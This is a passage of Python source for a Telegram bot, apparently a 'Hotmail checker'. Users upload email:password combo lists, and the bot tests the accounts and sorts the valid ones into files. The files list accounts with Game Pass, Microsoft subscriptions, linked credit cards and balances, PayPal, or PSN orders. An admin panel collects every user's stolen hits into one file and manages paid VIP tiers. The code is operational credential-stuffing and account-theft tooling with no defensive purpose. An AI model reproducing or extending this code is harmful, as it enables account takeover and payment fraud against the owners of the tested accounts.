            # xboxgp.txt — Xbox Game Pass accounts only
            xbox_keywords = ["game pass", "gamepass", "xbox"]
            xbox_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict):
                    subs = [s for s in rd.get("ms_subscriptions", []) if s and s != "N/A"]
                    matched = next(
                        (s for s in subs if any(kw in s.lower() for kw in xbox_keywords)), None
                    )
                    if matched:
                        xbox_lines.append(f"{e}:{p} | {matched}\n")
            if xbox_lines:
                xboxgp_file = io.BytesIO("".join(xbox_lines).encode())
                xboxgp_file.name = f"@Hotma1lch3ckerBot_xboxgp_{job.user_id}.txt"
                await safe_send_doc(
                    bot, job.chat_id, xboxgp_file,
                    caption=f"🎮 *xboxgp.txt — Xbox Game Pass: {len(xbox_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"xboxgp.txt ({len(xbox_lines)})")

            # ms.txt — all accounts with any Microsoft subscription
            ms_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict):
                    active = [s for s in rd.get("ms_subscriptions", []) if s and s != "N/A"]
                    if active:
                        ms_lines.append(f"{e}:{p} | {' | '.join(active)}\n")
            if ms_lines:
                ms_file_io = io.BytesIO("".join(ms_lines).encode())
                ms_file_io.name = f"ms_{job.user_id}.txt"
                await safe_send_doc(
                    bot, job.chat_id, ms_file_io,
                    caption=f"🪟 *ms.txt — Microsoft Subscriptions: {len(ms_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"ms.txt ({len(ms_lines)})")

            # credit_cards.txt — accounts with linked credit/debit cards
            cc_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict):
                    pay = [x for x in rd.get("payment_methods", []) if x and x != "N/A" and "paypal" not in x.lower()]
                    if pay:
                        bal = rd.get("balance", "")
                        bal_str = f" | Balance: {bal}" if bal else ""
                        cc_lines.append(f"{e}:{p} | {' / '.join(pay)}{bal_str}\n")
            if cc_lines:
                cc_file_io = io.BytesIO("".join(cc_lines).encode())
                cc_file_io.name = f"credit_cards_{job.user_id}.txt"
                await safe_send_doc(
                    bot, job.chat_id, cc_file_io,
                    caption=f"💳 *credit_cards.txt — Cards: {len(cc_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"credit_cards.txt ({len(cc_lines)})")

            # paypal.txt — accounts with PayPal linked
            pp_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict):
                    pay = [x for x in rd.get("payment_methods", []) if x and x != "N/A" and "paypal" in x.lower()]
                    if pay:
                        bal = rd.get("balance", "")
                        bal_str = f" | Balance: {bal}" if bal else ""
                        pp_lines.append(f"{e}:{p} | {' / '.join(pay)}{bal_str}\n")
            if pp_lines:
                pp_file_io = io.BytesIO("".join(pp_lines).encode())
                pp_file_io.name = f"paypal_{job.user_id}.txt"
                await safe_send_doc(
                    bot, job.chat_id, pp_file_io,
                    caption=f"🅿️ *paypal.txt — PayPal Accounts: {len(pp_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"paypal.txt ({len(pp_lines)})")

            # psn.txt — accounts with PSN purchase history
            psn_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict) and rd.get("psn_orders", 0) > 0:
                    psn_lines.append(f"{e}:{p} | PSN Orders: {rd['psn_orders']}\n")
            if psn_lines:
                psn_file_io = io.BytesIO("".join(psn_lines).encode())
                psn_file_io.name = f"psn_{job.user_id}.txt"
                await safe_send_doc(
                    bot, job.chat_id, psn_file_io,
                    caption=f"🕹 *psn.txt — PSN Accounts: {len(psn_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"psn.txt ({len(psn_lines)})")

        # all_valid.txt — all successfully logged-in accounts (hits + free), email:password only
        all_valid_accounts = hit_accounts + free_accounts
        if all_valid_accounts:
            all_valid_content = "\n".join(f"{e}:{p}" for e, p, _ in all_valid_accounts) + "\n"
            all_valid_file_io = io.BytesIO(all_valid_content.encode())
            all_valid_file_io.name = f"@Hotma1lch3ckerBot_all_valid_{job.user_id}.txt"
            await safe_send_doc(
                bot, job.chat_id, all_valid_file_io,
                caption=f"📋 *all\\_valid.txt — All Valid Accounts: {len(all_valid_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append(f"all_valid.txt ({len(all_valid_accounts)})")

        # Build subscription breakdown for summary
        sub_breakdown = []
        if job.ms_hits:
            sub_breakdown.append(f"  🪟 MS Subscriptions: {job.ms_hits}")
        if job.xbox_ultimate:
            sub_breakdown.append(f"  🎮 GP Ultimate: {job.xbox_ultimate}")
        if job.xbox_other:
            sub_breakdown.append(f"  🎮 GP Other: {job.xbox_other}")
        if job.office_hits:
            sub_breakdown.append(f"  💼 Office/M365: {job.office_hits}")
        if job.psn_hits:
            sub_breakdown.append(f"  🕹 PSN Orders: {job.psn_hits}")
        if job.cc_hits:
            sub_breakdown.append(f"  💳 Credit Cards: {job.cc_hits}")
        if job.paypal_hits:
            sub_breakdown.append(f"  🅿️ PayPal: {job.paypal_hits}")
        sub_block = ("\n" + "\n".join(sub_breakdown) + "\n") if sub_breakdown else ""

        elapsed_total = time.time() - job.start_time if job.start_time else 0
        avg_speed = job.total / elapsed_total if elapsed_total > 0 else 0

        summary = (
            f"📊 *Job Summary — {job.filename}*\n\n"
            f"🎯 HIT: `{job.hits}`\n"
            f"🆓 FREE: `{job.free}`\n"
            f"❌ BAD: `{job.bads}`\n"
            f"🔐 2FA: `{job.twofa}`\n"
            f"⚠️ Errors: `{job.errors}`\n"
            f"⚡ Avg Speed: `{avg_speed:.1f}` acc/s"
            f"{sub_block}\n"
            f"📁 Files: {', '.join(f'`{f}`' for f in files_sent) if files_sent else 'none'}\n"
        )
        await safe_send(bot, job.chat_id, summary, parse_mode=ParseMode.MARKDOWN)


async def queue_worker(bot):
    while True:
        job = await job_queue.get()
        if job.status == "cancelled":
            job_queue.task_done()
            continue
        logger.info("Starting job for user %d | %d accounts | file=%s",
                    job.user_id, job.total, job.filename)
        try:
            msg = await safe_send(bot, job.chat_id, format_dashboard_html(job), parse_mode=ParseMode.HTML)
            if msg:
                job.dashboard_msg_id = msg.message_id

            try:
                await process_job(job, bot)
            except Exception as e:
                logger.error("process_job error for user %d: %s", job.user_id, e, exc_info=True)
                job.status = "failed"
                await safe_send(bot, job.chat_id, f"⚠️ An error occurred during processing: {str(e)[:100]}")

            status_text = "✅ Job completed!" if job.status == "completed" else "❌ Job cancelled."
            if job.status == "failed":
                status_text = "❌ Job failed due to an internal error."

            logger.info("Job finished for user %d | status=%s hits=%d free=%d bad=%d errors=%d",
                        job.user_id, job.status, job.hits, job.free, job.bads, job.errors)
            await safe_send(bot, job.chat_id, status_text)
        except Exception as e:
            logger.error("queue_worker error for user %d: %s", job.user_id, e, exc_info=True)
            try:
                await safe_send(bot, job.chat_id, f"⚠️ Critical error in job queue: {str(e)[:100]}")
            except Exception:
                pass
        finally:
            if job.user_id in user_jobs and user_jobs[job.user_id] is job:
                del user_jobs[job.user_id]
            job_queue.task_done()


# ================= DAILY RESET =================
async def daily_reset_check():
    last_check_date = None
    while True:
        today = get_today_istanbul()
        if last_check_date != today:
            users = load_users()
            changed = False
            for uid in users:
                user = users[uid]
                if user.get("daily_stats", {}).get("date") != today.isoformat():
                    user["daily_stats"] = {"date": today.isoformat(), "files_uploaded": 0}
                    changed = True
                for field, default in [("vip_level", 0), ("total_jobs", 0), ("total_hits", 0)]:
                    if field not in user:
                        user[field] = default
                        changed = True
            if changed:
                save_users(users)
                logger.info("Daily counters reset. Total users: %d", len(users))
            last_check_date = today
        await asyncio.sleep(3600)


# ================= ADMIN PANEL =================
LEVEL_NAMES = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}


def _admin_main_keyboard():
    users = load_users()
    pending = sum(1 for u in users.values() if not u.get("approved") and not u.get("banned"))
    pending_label = f"⏳ Pending ({pending})" if pending else "⏳ Pending (0)"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Dashboard", callback_data="adm_dash"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users_0")],
        [InlineKeyboardButton(pending_label, callback_data="adm_pending"),
         InlineKeyboardButton("📁 All Hits", callback_data="adm_allhits")],
    ])


async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    await update.message.reply_text(
        "👑 *Admin Panel*\n\nChoose an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=_admin_main_keyboard()
    )


async def safe_edit(query, text, **kwargs):
    try:
        await query.edit_message_text(text, **kwargs)
    except BadRequest as e:
        if "message is not modified" in str(e).lower():
            pass
        else:
            raise


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        try:
            await query.edit_message_text("❌ Unauthorized")
        except BadRequest:
            pass
        return

    data = query.data

    try:
        await _admin_dispatch(query, data, context)
    except BadRequest as e:
        if "message is not modified" not in str(e).lower():
            logger.error("BadRequest in admin_callback: %s", e)
    except Exception as e:
        logger.error("Error in admin_callback: %s", e, exc_info=True)
        try:
            await query.message.reply_text("⚠️ An error occurred. Please try again.")
        except Exception:
            pass


async def _admin_dispatch(query, data: str, context):

    # ── Main menu ──────────────────────────────────────────────────────────────
    if data == "adm_home":
        await query.edit_message_text(
            "👑 *Admin Panel*\n\nChoose an option:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=_admin_main_keyboard()
        )

    # ── Dashboard ──────────────────────────────────────────────────────────────
    elif data == "adm_dash":
        users = load_users()
        total_users = len(users)
        banned_count = sum(1 for u in users.values() if u.get("banned"))
        vip_count = sum(1 for u in users.values() if u.get("vip_level", 0) > 0)
        approved_count = sum(1 for u in users.values() if u.get("approved"))
        pending_count = sum(1 for u in users.values() if not u.get("approved") and not u.get("banned"))
        total_jobs = sum(u.get("total_jobs", 0) for u in users.values())
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        files_today = sum(u.get("daily_stats", {}).get("files_uploaded", 0) for u in users.values())
        active_now = len([j for j in user_jobs.values() if j.status == "running"])

        total_result_files = 0
        if os.path.exists(RESULT_BASE_DIR):
            for root, dirs, files in os.walk(RESULT_BASE_DIR):
                total_result_files += len([f for f in files if f.endswith(".txt")])

        text = (
            f"📊 *Admin Dashboard*\n\n"
            f"👥 Total users: `{total_users}`\n"
            f"✅ Approved: `{approved_count}` | ⏳ Pending: `{pending_count}` | 🚫 Banned: `{banned_count}`\n"
            f"⭐ VIP users: `{vip_count}`\n\n"
            f"⚡ Active jobs: `{active_now}`\n"
            f"📋 Total jobs: `{total_jobs}`\n"
            f"🎯 Total hits: `{total_hits}`\n"
            f"📁 Files today: `{files_today}`\n"
            f"📚 Result files: `{total_result_files}`\n"
        )
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
        )

    # ── Pending users list ────────────────────────────────────────────────────
    elif data == "adm_pending":
        users = load_users()
        pending = {uid: u for uid, u in users.items() if not u.get("approved") and not u.get("banned")}
        if not pending:
            await query.edit_message_text(
                "✅ No pending users.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
            )
            return
        keyboard = []
        for uid, u in list(pending.items())[:20]:
            uname = u.get("username", "")
            label = f"@{uname}" if uname else f"ID {uid}"
            keyboard.append([
                InlineKeyboardButton(f"👤 {label}", callback_data=f"adm_manage_{uid}"),
                InlineKeyboardButton("✅", callback_data=f"adm_approve_{uid}"),
                InlineKeyboardButton("🚫", callback_data=f"adm_reject_{uid}"),
            ])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="adm_home")])
        await query.edit_message_text(
            f"⏳ *Pending Users ({len(pending)})*\n\nSelect a user to manage or use ✅/🚫 to approve/reject:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Approve user ──────────────────────────────────────────────────────────
    elif data.startswith("adm_approve_"):
        uid = data[len("adm_approve_"):]
        update_user(int(uid), {"approved": True, "banned": False})
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text="✅ *Your access has been approved!*\n\nYou can now use the bot. Send /start to begin.",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        await _show_user_panel(query, uid, "✅ User approved and notified.")

    # ── Reject user ───────────────────────────────────────────────────────────
    elif data.startswith("adm_reject_"):
        uid = data[len("adm_reject_"):]
        update_user(int(uid), {"approved": False, "banned": True})
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text="🚫 Your access request has been rejected."
            )
        except Exception:
            pass
        await _show_user_panel(query, uid, "🚫 User rejected and banned.")

    # ── All Hits ───────────────────────────────────────────────────────────────
    elif data == "adm_allhits":
        seen = set()
        clean_combos = []
        if os.path.exists(RESULT_BASE_DIR):
            for user_dir in sorted(os.listdir(RESULT_BASE_DIR)):
                user_path = os.path.join(RESULT_BASE_DIR, user_dir)
                if not os.path.isdir(user_path):
                    continue
                for job_dir in sorted(os.listdir(user_path)):
                    valid_file = os.path.join(user_path, job_dir, "valid.txt")
                    if os.path.exists(valid_file):
                        with open(valid_file, "r", encoding="utf-8") as f:
                            for line in f:
                                line = line.strip()
                                if line and line not in seen:
                                    seen.add(line)
                                    clean_combos.append(line)
        if not clean_combos:
            await query.edit_message_text("No hits found yet.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]]))
            return
        content = "\n".join(clean_combos) + "\n"
        hits_io = io.BytesIO(content.encode())
        hits_io.name = "all_hits.txt"
        await query.message.reply_document(
            document=hits_io,
            caption=f"📁 All Hits: {len(clean_combos)} unique accounts"
        )

    # ── Find user tip ──────────────────────────────────────────────────────────
    elif data == "adm_find":
        await query.edit_message_text(
            "🔍 Use `/manage <user_id>` to open a user's management panel.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
        )

    # ── User list (paginated) ──────────────────────────────────────────────────
    elif data.startswith("adm_users_"):
        page = int(data[len("adm_users_"):])
        users = load_users()
        uids = list(users.keys())
        page_size = 8
        start = page * page_size
        page_uids = uids[start:start + page_size]

        keyboard = []
        for uid in page_uids:
            u = users[uid]
            level = u.get("vip_level", 0)
            banned = "🚫" if u.get("banned") else ""
            label = LEVEL_NAMES.get(level, str(level))
            keyboard.append([InlineKeyboardButton(
                f"{banned}{uid} | {label} | Jobs:{u.get('total_jobs',0)} Hits:{u.get('total_hits',0)}",
                callback_data=f"adm_manage_{uid}"
            )])

        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"adm_users_{page-1}"))
        if start + page_size < len(uids):
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"adm_users_{page+1}"))
        if nav:
            keyboard.append(nav)
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="adm_home")])

        await query.edit_message_text(
            f"👥 *Users ({len(uids)} total) — Page {page+1}*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Manage individual user ─────────────────────────────────────────────────
    elif data.startswith("adm_manage_"):
        uid = data[len("adm_manage_"):]
        await _show_user_panel(query, uid)

    # ── Set VIP level ──────────────────────────────────────────────────────────
    elif data.startswith("adm_lvl_"):
        parts = data[len("adm_lvl_"):].split("_", 1)
        uid, lvl = parts[0], int(parts[1])
        update_user(int(uid), {"vip_level": lvl})
        await _show_user_panel(query, uid, f"✅ Level set to {LEVEL_NAMES[lvl]}")

    # ── Set daily limit ────────────────────────────────────────────────────────
    elif data.startswith("adm_lim_"):
        parts = data[len("adm_lim_"):].split("_", 1)
        uid, lim = parts[0], parts[1]
        val = None if lim == "none" else int(lim)
        update_user(int(uid), {"custom_daily_limit": val})
        label = "∞ (VIP default)" if val is None else str(val)
        await _show_user_panel(query, uid, f"✅ Daily limit set to {label}")

    # ── Ban / Unban ────────────────────────────────────────────────────────────
    elif data.startswith("adm_ban_"):
        uid = data[len("adm_ban_"):]
        update_user(int(uid), {"banned": True})
        await _show_user_panel(query, uid, "🚫 User banned.")

    elif data.startswith("adm_unban_"):
        uid = data[len("adm_unban_"):]
        update_user(int(uid), {"banned": False})
        await _show_user_panel(query, uid, "✅ User unbanned.")

    # ── Reset daily count ──────────────────────────────────────────────────────
    elif data.startswith("adm_reset_"):
        uid = data[len("adm_reset_"):]
        users = load_users()
        if uid in users:
            users[uid]["daily_stats"] = {"date": get_today_istanbul().isoformat(), "files_uploaded": 0}
            save_users(users)
        await _show_user_panel(query, uid, "✅ Daily counter reset.")

    # ── User job files ─────────────────────────────────────────────────────────
    elif data.startswith("adm_files_"):
        uid = data[len("adm_files_"):]
        user_path = os.path.join(RESULT_BASE_DIR, uid)
        if not os.path.exists(user_path):
            await query.edit_message_text(f"No result files for user {uid}.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"adm_manage_{uid}")]]))
            return
        keyboard = []
        for job_dir in sorted(os.listdir(user_path))[-10:]:
            job_path = os.path.join(user_path, job_dir)
            if not os.path.isdir(job_path):
                continue
            hits_file = os.path.join(job_path, "hits.txt")
            hit_count = 0
            if os.path.exists(hits_file):
                with open(hits_file, "r", encoding="utf-8") as f:
                    hit_count = len(f.readlines())
            display = job_dir[:22] + ".." if len(job_dir) > 24 else job_dir
            keyboard.append([InlineKeyboardButton(
                f"📁 {display} ({hit_count} hits)",
                callback_data=f"adm_job_{uid}|{job_dir}"
            )])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data=f"adm_manage_{uid}")])
        await query.edit_message_text(
            f"📂 *Files for {uid}*", parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Send job files ─────────────────────────────────────────────────────────
    elif data.startswith("adm_job_"):
        remainder = data[len("adm_job_"):]
        uid, job_dir = remainder.split("|", 1)
        job_path = os.path.join(RESULT_BASE_DIR, uid, job_dir)
        for fname in ["hits.txt", "free.txt", "valid.txt", "xboxgp.txt"]:
            fpath = os.path.join(job_path, fname)
            if os.path.exists(fpath):
                with open(fpath, "r", encoding="utf-8") as f:
                    content = f.read()
                fio = io.BytesIO(content.encode())
                fio.name = f"{uid}_{fname}"
                await query.message.reply_document(document=fio, caption=f"📁 {fname} — user {uid}")


async def _show_user_panel(query, uid: str, notice: str = ""):
    users = load_users()
    u = users.get(uid, {})
    level = u.get("vip_level", 0)
    banned = u.get("banned", False)
    custom_lim = u.get("custom_daily_limit")
    daily_used = u.get("daily_stats", {}).get("files_uploaded", 0)
    eff_limit = custom_lim if custom_lim is not None else DAILY_FILE_LIMITS.get(level, 3)
    lim_display = "∞" if eff_limit >= 9999 else str(eff_limit)

    approved = u.get("approved", False)
    status_icon = "🚫 BANNED" if banned else ("✅ Approved" if approved else "⏳ Pending")
    uname = u.get("username", "")
    uname_str = f" (@{uname})" if uname else ""

    text = (
        f"👤 *User: `{uid}`*{uname_str}\n"
        f"Status: {status_icon}\n"
        f"Level: {LEVEL_NAMES.get(level, str(level))}\n"
        f"Daily files: `{daily_used}/{lim_display}` "
        f"{'(custom)' if custom_lim is not None else ''}\n"
        f"Total jobs: `{u.get('total_jobs', 0)}` | Hits: `{u.get('total_hits', 0)}`\n"
    )
    if notice:
        text += f"\n_{notice}_"

    keyboard = []

    if not approved and not banned:
        keyboard.append([
            InlineKeyboardButton("✅ Approve", callback_data=f"adm_approve_{uid}"),
            InlineKeyboardButton("🚫 Reject", callback_data=f"adm_reject_{uid}"),
        ])

    keyboard += [
        [
            InlineKeyboardButton("👤 Normal", callback_data=f"adm_lvl_{uid}_0"),
            InlineKeyboardButton("⭐ VIP", callback_data=f"adm_lvl_{uid}_1"),
            InlineKeyboardButton("👑 VIP+", callback_data=f"adm_lvl_{uid}_2"),
        ],
        [
            InlineKeyboardButton("📅 3/day", callback_data=f"adm_lim_{uid}_3"),
            InlineKeyboardButton("📅 10", callback_data=f"adm_lim_{uid}_10"),
            InlineKeyboardButton("📅 25", callback_data=f"adm_lim_{uid}_25"),
            InlineKeyboardButton("📅 ∞", callback_data=f"adm_lim_{uid}_9999"),
        ],
        [
            InlineKeyboardButton("🔄 Reset Daily", callback_data=f"adm_reset_{uid}"),
            InlineKeyboardButton("📁 Files", callback_data=f"adm_files_{uid}"),
        ],
        [
            InlineKeyboardButton("🚫 Ban" if not banned else "✅ Unban",
                                 callback_data=f"adm_ban_{uid}" if not banned else f"adm_unban_{uid}"),
        ],
        [InlineKeyboardButton("🔙 User List", callback_data="adm_users_0")],
    ]
    await query.edit_message_text(
        text, parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ================= BOT COMMANDS =================
async def _notify_admin_new_user(bot, user_id: int, username: str):
    for admin_id in ADMIN_IDS:
        try:
            name_str = f"@{username}" if username else f"ID: {user_id}"
            await safe_send(
                bot, admin_id,
                f"🔔 *New user requesting access*\n\n"
                f"👤 {name_str}\n"
                f"🆔 `{user_id}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ Approve", callback_data=f"adm_approve_{user_id}"),
                        InlineKeyboardButton("🚫 Reject", callback_data=f"adm_reject_{user_id}"),
                    ]
                ])
            )
        except Exception:
            pass


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    tg_user = update.effective_user
    username = tg_user.username or ""

    is_new = str(user_id) not in load_users()
    user = get_user(user_id)

    if username and user.get("username") != username:
        update_user(user_id, {"username": username})

    if user_id in ADMIN_IDS or user.get("approved"):
        level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
        daily_files = user["daily_stats"]["files_uploaded"]
        daily_limit = get_daily_limit(user)
        limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

        text = (
            f"👋 *Welcome!*\n\n"
            f"**Your Level:** {level_names[user['vip_level']]}\n"
            f"**Today:** {limit_text} files\n\n"
            f"📎 Upload a `.txt` file (each line: `email:password`)\n"
            f"Bot will scan for 200+ platforms\n\n"
            f"*Commands:*\n"
            f"/stats – Your statistics\n"
            f"/cancel – Cancel current job"
        )
        if user_id in ADMIN_IDS:
            text += (
                "\n\n*Admin Commands:*\n"
                "/admin – Admin Panel\n"
                "/manage `<id>` – Manage a user\n"
                "/setlevel `<id>` `<0|1|2>` – Set VIP level\n"
                "/setlimit `<id>` `<n>` – Set daily file limit\n"
                "/ban `<id>` – Ban user\n"
                "/unban `<id>` – Unban user"
            )
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(
            "⏳ *Your request is pending admin approval.*\n\n"
            "You will be notified once access is granted.",
            parse_mode=ParseMode.MARKDOWN
        )
        if is_new:
            await _notify_admin_new_user(context.bot, user_id, username)


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)

    if not user.get("approved") and user_id not in ADMIN_IDS:
        await update.message.reply_text("⏳ Access pending admin approval.")
        return

    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user["daily_stats"]["files_uploaded"]
    daily_limit = get_daily_limit(user)
    limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

    await update.message.reply_text(
        f"📊 *Your Statistics*\n\n"
        f"**Level:** {level_names[user['vip_level']]}\n"
        f"**Today's files:** {limit_text}\n"
        f"**Total jobs:** {user['total_jobs']}\n"
        f"**Total hits:** {user['total_hits']}",
        parse_mode=ParseMode.MARKDOWN
    )


async def setlevel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
        level = int(context.args[1])
        if level not in (0, 1, 2):
            await update.message.reply_text("Level must be 0, 1, or 2.")
            return
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlevel <user_id> <0|1|2>")
        return
    update_user(target_id, {"vip_level": level})
    await update.message.reply_text(f"✅ User `{target_id}` level → {LEVEL_NAMES[level]}", parse_mode=ParseMode.MARKDOWN)


async def setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
        limit = int(context.args[1])
        if limit < 0:
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlimit <user_id> <number>  (0 = block, 9999 = unlimited)")
        return
    update_user(target_id, {"custom_daily_limit": limit})
    label = "∞" if limit >= 9999 else str(limit)
    await update.message.reply_text(f"✅ User `{target_id}` daily limit → `{label}` files/day", parse_mode=ParseMode.MARKDOWN)


async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    get_user(target_id)
    update_user(target_id, {"banned": True})
    await update.message.reply_text(f"🚫 User `{target_id}` has been banned.", parse_mode=ParseMode.MARKDOWN)


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    update_user(target_id, {"banned": False})
    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode=ParseMode.MARKDOWN)


async def manage_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = str(int(context.args[0]))
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /manage <user_id>")
        return
    get_user(int(target_id))
    users = load_users()
    u = users.get(target_id, {})
    level = u.get("vip_level", 0)
    banned = u.get("banned", False)
    custom_lim = u.get("custom_daily_limit")
    daily_used = u.get("daily_stats", {}).get("files_uploaded", 0)
    eff_limit = custom_lim if custom_lim is not None else DAILY_FILE_LIMITS.get(level, 3)
    lim_display = "∞" if eff_limit >= 9999 else str(eff_limit)

    text = (
        f"{'🚫 BANNED — ' if banned else ''}👤 *User: `{target_id}`*\n\n"
        f"Level: {LEVEL_NAMES.get(level, str(level))}\n"
        f"Daily files: `{daily_used}/{lim_display}` "
        f"{'(custom)' if custom_lim is not None else ''}\n"
        f"Total jobs: `{u.get('total_jobs', 0)}` | Hits: `{u.get('total_hits', 0)}`\n"
    )
    keyboard = [
        [
            InlineKeyboardButton("👤 Normal", callback_data=f"adm_lvl_{target_id}_0"),
            InlineKeyboardButton("⭐ VIP", callback_data=f"adm_lvl_{target_id}_1"),
            InlineKeyboardButton("👑 VIP+", callback_data=f"adm_lvl_{target_id}_2"),
        ],
        [
            InlineKeyboardButton("📅 3/day", callback_data=f"adm_lim_{target_id}_3"),
            InlineKeyboardButton("📅 10", callback_data=f"adm_lim_{target_id}_10"),
            InlineKeyboardButton("📅 25", callback_data=f"adm_lim_{target_id}_25"),
            InlineKeyboardButton("📅 ∞", callback_data=f"adm_lim_{target_id}_9999"),
        ],
        [
            InlineKeyboardButton("🔄 Reset Daily", callback_data=f"adm_reset_{target_id}"),
            InlineKeyboardButton("📁 Files", callback_data=f"adm_files_{target_id}"),
        ],
        [
            InlineKeyboardButton("🚫 Ban" if not banned else "✅ Unban",
                                 callback_data=f"adm_ban_{target_id}" if not banned else f"adm_unban_{target_id}"),
        ],
    ]
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    job = user_jobs.get(user_id)
    if job and job.status == "running":
        job.cancel_event.set()
        await update.message.reply_text("⏹️ Cancelling your job...")
    else:
        await update.message.reply_text("You have no active job.")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    user = get_user(user_id)

    if not user.get("approved") and user_id not in ADMIN_IDS:
        await update.message.reply_text("⏳ Your account is pending admin approval.")
        return

    if user.get("banned"):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    vip_level = user.get("vip_level", 0)
    max_file_size = FILE_SIZE_LIMITS.get(vip_level, FILE_SIZE_LIMITS[0])
    daily_limit = get_daily_limit(user)
    daily_uploaded = user["daily_stats"]["files_uploaded"]

    if daily_limit != 9999 and daily_uploaded >= daily_limit:
        await update.message.reply_text(
            f"❌ Daily limit reached: {daily_uploaded}/{daily_limit} files.\n"
            f"Try again tomorrow or contact admin."
        )
        return

    doc = update.message.document
    if doc.file_size > max_file_size:
        mb_limit = max_file_size / (1024 * 1024)
        await update.message.reply_text(f"❌ Max file size: {mb_limit:.0f} MB for your level.")
        return

    if user_id in user_jobs and user_jobs[user_id].status in ("queued", "running"):
        await update.message.reply_text("You already have a job in progress. Use /cancel first.")
        return

    file = await doc.get_file()
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode("utf-8", errors="ignore")

    raw_list = []
    for line in content.splitlines():
        line = line.strip()
        if ":" in line:
